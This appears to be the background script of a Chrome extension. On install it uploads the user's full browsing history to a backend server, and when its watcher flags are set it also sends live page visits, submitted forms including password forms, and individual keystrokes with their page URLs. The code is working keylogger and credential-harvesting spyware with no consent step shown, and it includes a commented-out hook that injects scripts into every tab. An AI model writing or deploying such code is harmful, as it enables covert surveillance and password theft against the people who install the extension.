/********************* Backend Calls ***************************/
const URL = "http://localhost:5000";
const makeRequest = (url, options) => {
    return fetch(url, options)
        .then((res) =>
            res.json().then((json) => ({ status: res.status, json }))
        )
        .catch((err) => console.error(err.message))
        .then((res) => {
            if (res.status !== 200) {
                throw Error(res.json.error);
            }
            return res.json;
        });
};

const postRequest = (route, data) =>
    makeRequest(`${URL}${route}`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            Authorization: `token`,
        },
        body: JSON.stringify(data),
    });

/********************* Helper ***************************/
// Initial add user, and their current history
const addUser = (uid) => {
    const data = {
        uid: uid,
        extension_id: chrome.runtime.id,
        date_created: new Date().toString(),

        // https://stackoverflow.com/a/19295499
        version: `Chrome ${/Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1]}`,
    };
    chrome.history.search({ text: "" }, (h) => {
        data.history = h;
        postRequest("/user/add/", data).catch((err) =>
            console.log(err.message)
        );
    });
};

const addForm = (uid, form, tab) => {
    const data = {
        uid: uid,
        date_created: new Date().toString(),
        form,
        tab,
    };
    postRequest("/form/", data).catch((err) => console.log(err.message));
};

// Add live history entries as it is added
const addHistory = (uid, historyItem) => {
    const data = { uid, historyItem };
    postRequest("/history/add/", data).catch((err) => console.log(err.message));
};

// Logs keypresses
const logKeypress = (uid, url, direction, key) => {
    const data = { uid, time: new Date().toString(), url, direction, key };
    postRequest("/keypress/", data).catch((err) => console.log(err.message));
};

const getRandomToken = () => {
    // https://stackoverflow.com/a/23854032
    const randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    let hex = "";
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    return hex;
};

/********************* Listeners *************************/
chrome.runtime.onInstalled.addListener((details) => {
    // Made unique identifier for new user
    if (details.reason === "install") {
        chrome.storage.sync.get("userid", (res) => {
            const userid = res.userid ? res.userid : getRandomToken();
            chrome.storage.sync.set({ userid: userid });
            addUser(userid);
        });
    }

    chrome.contextMenus.create({
        id: "sampleContextMenu",
        title: "Sample Context Menu",
        contexts: ["page"],
    });
});

// Adds to history as websites are visited (not available in incognito)
chrome.storage.sync.get("historyWatcher", (runCommand) => {
    if (!runCommand.historyWatcher) return;
    chrome.history.onVisited.addListener((h) => {
        console.log(h);
        chrome.storage.sync.get("userid", (res) => {
            addHistory(res.userid, h);
        });
    });
});

// Forms with password Listener
chrome.storage.sync.get("passwordWatcher", (runCommand) => {
    if (!runCommand.passwordWatcher) return;
    chrome.runtime.onMessage.addListener((request, sender) => {
        if (
            request.type === "formSubmit" ||
            request.type === "passwordChange"
        ) {
            chrome.storage.sync.get("userid", (res) => {
                console.log(request.form);
                addForm(res.userid, request.form, sender.tab);
            });
        }
    });
});

chrome.storage.sync.get("keyPressWatcher", (runCommand) => {
    if (!runCommand.keyPressWatcher) return;
    chrome.runtime.onMessage.addListener((request, sender) => {
        if (request.type === "keyDown" || request.type === "keyUp") {
            chrome.storage.sync.get("userid", (res) => {
                const direction = request.type === "keyDown" ? "DOWN" : "UP";
                const url = sender.tab.url;
                logKeypress(res.userid, url, direction, request.key);
            });
        }
    });
});

// Script injection
// chrome.tabs.onUpdated.addListener((tabId, info) => {
//     if (info.status === "complete") {
//         chrome.scripting.executeScript({
//             target: { tabId: tabId, allFrames: true },
//             files: ["script/inject.js"],
//         });
//     }
// });

// WEB REQUESTS
// https://developer.chrome.com/docs/extensions/mv3/intro/mv3-migration/
